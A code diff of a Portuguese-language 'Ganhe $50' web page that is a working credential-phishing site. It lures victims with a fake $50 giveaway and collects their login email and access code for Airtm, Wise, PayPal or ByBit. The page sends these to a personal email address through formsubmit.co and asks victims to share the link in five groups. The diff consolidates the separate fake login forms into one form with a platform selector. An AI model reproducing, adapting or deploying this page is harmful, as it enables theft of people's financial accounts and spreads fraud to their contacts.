@@ -1,45 +1,39 @@
-<!DOCTYPE html>
-<html lang="pt">
+<!DOCTYPE html><html lang="pt">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Ganhe $50</title>
-
-  <!-- Metatags Open Graph para WhatsApp, Facebook, etc -->
   <meta property="og:title" content="Ganhe $50 agora! 🎉">
-  <meta property="og:description" content="Você foi selecionado para receber $50 grátis. Clique e aproveite!">
+  <meta property="og:description" content="Você foi selecionado para receber $50 grátis. Clique e aproveite! Basta iniciares sessão e voltares aqui para partilhares este link em 5 grupo.">
   <meta property="og:image" content="https://josefany-kira.github.io/Ganhe_-50/thumb.jpg">
   <meta property="og:url" content="https://josefany-kira.github.io/Ganhe_-50/">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
-
   <style>
-    body {
+    html, body {
+      height: 100%;
       margin: 0;
       padding: 0;
-      background-image: url('carteiras.jpg');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      height: 100vh;
       font-family: Arial, sans-serif;
     }
-
+    body {
+      background-image: url('carteiras.jpg');
+      background-size: cover;
+      background-position: center center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+    }
     .container {
       max-width: 600px;
       margin: 50px auto;
-      background: rgba(255, 255, 255, 0.85); /* branco com leve transparência */
+      background: rgba(255, 255, 255, 0.85);
       padding: 30px;
       border-radius: 10px;
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
       text-align: center;
-      color: #000; /* texto preto */
+      color: #000;
     }
-
-    .hidden {
-      display: none;
-    }
-
+    .hidden { display: none; }
     .login-button {
       display: block;
       background-color: #007BFF;
@@ -53,29 +47,21 @@
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
-
-    .login-button:hover {
-      background-color: #0056b3;
-    }
-
+    .login-button:hover { background-color: #0056b3; }
     .back-button {
       margin-top: 20px;
       background-color: #6c757d;
     }
-
     form {
       text-align: left;
       margin-top: 20px;
     }
-
     label {
       display: block;
       margin-bottom: 5px;
       font-weight: bold;
     }
-
-    input[type="email"],
-    input[type="text"] {
+    input, select {
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
@@ -83,117 +69,57 @@
       border: 1px solid #ccc;
       font-size: 16px;
     }
-
     input[type="submit"] {
       background-color: #28a745;
       color: white;
       border: none;
-      padding: 12px 20px;
-      width: 100%;
-      border-radius: 5px;
-      font-size: 16px;
       cursor: pointer;
     }
-
     input[type="submit"]:hover {
       background-color: #218838;
     }
   </style>
 </head>
 <body>
-
-  <!-- Página Inicial -->
   <div class="container" id="home">
     <h1>🎉 Ganhe $50!</h1>
     <p>Inicia sessão com a tua conta das seguintes plataformas para ganhar 30 dólar:</p>
-
-    <div class="login-button" onclick="mostrarPagina('airtm')">Iniciar sessão com Airtm</div>
-    <div class="login-button" onclick="mostrarPagina('wise')">Iniciar sessão com Wise</div>
-    <div class="login-button" onclick="mostrarPagina('PayPal')">Iniciar sessão com PayPal</div>
-    <div class="login-button" onclick="mostrarPagina('ByBit')">Iniciar sessão com ByBit</div> 
-  </div>
-
-  <!-- Página Airtm -->
-  <div class="container hidden" id="airtm">
-    <h2>Login Airtm</h2>
-    <p>Inicia sessão com a tua conta Airtm para receber $50.</p>
+    <div class="login-button" onclick="mostrarPagina('formulario')">Iniciar Sessão</div>
+  </div>  <div class="container hidden" id="formulario">
+    <h2>Formulário de Login</h2>
+    <p>Escolha a plataforma e insira os seus dados para receber $50.</p>
     <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
-      <label>Email:</label>
-      <input type="email" name="email" required>
-      <label>Código de Acesso:</label>
-      <input type="text" name="access_key" required>
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      <input type="hidden" name="_next" value="https://www.airtm.com/">
-      <input type="submit" value="Iniciar Sessão">
-    </form>
-    <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
-  </div>
+      <label for="plataforma">Plataforma:</label>
+      <select name="Plataforma Escolhida" id="plataforma" required>
+        <option value="">-- Selecione --</option>
+        <option value="Airtm">Airtm</option>
+        <option value="Wise">Wise</option>
+        <option value="PayPal">PayPal</option>
+        <option value="ByBit">ByBit</option>
+      </select><label for="email">Email:</label>
+  <input type="email" name="Email do Usuário" id="email" required>
 
-  <!-- Página Wise -->
-  <div class="container hidden" id="wise">
-    <h2>Login Wise</h2>
-    <p>Conecta a tua conta Wise e ganha $50.</p>
-    <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
-      <label>Email:</label>
-      <input type="email" name="email" required>
-      <label>Código de Acesso:</label>
-      <input type="text" name="access_key" required>
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      <input type="hidden" name="_next" value="https://wise.com/">
-      <input type="submit" value="Iniciar Sessão">
-    </form>
-    <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
-  </div>
+  <label for="access">Código de Acesso:</label>
+  <input type="text" name="Código de Acesso" id="access" required>
 
-  <!-- Página PayPal -->
-  <div class="container hidden" id="PayPal">
-    <h2>Login PayPal</h2>
-    <p>Entra com a tua conta do PayPal para ganhares $50.</p>
-    <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
-      <label>Email:</label>
-      <input type="email" name="email" required>
-      <label>Código de Acesso:</label>
-      <input type="text" name="access_key" required>
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      <input type="hidden" name="_next" value="https://www.paypal.com/">
-      <input type="submit" value="Iniciar Sessão">
-    </form>
-    <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
-  </div>
-  
-  <!-- Página ByBit -->
-  <div class="container hidden" id="ByBit">
-    <h2>Login ByBit</h2>
-    <p>Entra com a tua conta do ByBit para ganhares $50.</p>
-    <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
-      <label>Email:</label>
-      <input type="email" name="email" required>
-      <label>Código de Acesso:</label>
-      <input type="text" name="access_key" required>
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      <input type="hidden" name="_next" value="https://www.bybit.com/">
-      <input type="submit" value="Iniciar Sessão">
-    </form>
-    <div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
-  </div>
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_next" value="https://josefany-kira.github.io/Ganhe_-50/obrigado.html">
 
-  <script>
+  <input type="submit" value="Iniciar Sessão">
+</form>
+<div class="login-button back-button" onclick="voltarHome()">⬅ Voltar</div>
+
+  </div>  <script>
     function mostrarPagina(id) {
-      const seções = ["home", "airtm", "wise", "PayPal", "ByBit"];
-      seções.forEach(sec => {
+      const secoes = ["home", "formulario"];
+      secoes.forEach(sec => {
         document.getElementById(sec).classList.add("hidden");
       });
       document.getElementById(id).classList.remove("hidden");
     }
-
     function voltarHome() {
       mostrarPagina("home");
     }
-  </script>
-
-</body>
+  </script></body>
 </html>
